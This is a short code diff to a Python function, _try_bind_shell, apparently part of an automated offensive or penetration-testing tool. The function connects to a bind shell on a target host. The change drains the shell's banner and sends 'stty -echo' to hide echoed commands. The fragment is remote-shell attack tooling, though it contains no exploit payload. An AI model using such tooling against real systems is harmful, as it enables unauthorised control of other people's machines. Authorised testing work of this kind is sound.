@@ -170,9 +170,17 @@ def _try_bind_shell(log) -> ShellSession | None:
     try:
         sock = socket.create_connection((TARGET_HOST, BIND_PORT), timeout=5)
         sock.settimeout(8)
-        time.sleep(0.4)
+        # drain initial prompt/banner
+        time.sleep(0.5)
         try:
             sock.recv(512)
+        except socket.timeout:
+            pass
+        # disable terminal echo so sent commands aren't reflected back in output
+        sock.sendall(b"stty -echo\n")
+        time.sleep(0.3)
+        try:
+            sock.recv(256)
         except socket.timeout:
             pass
         log(f"[agent] bind shell connected on :{BIND_PORT}")
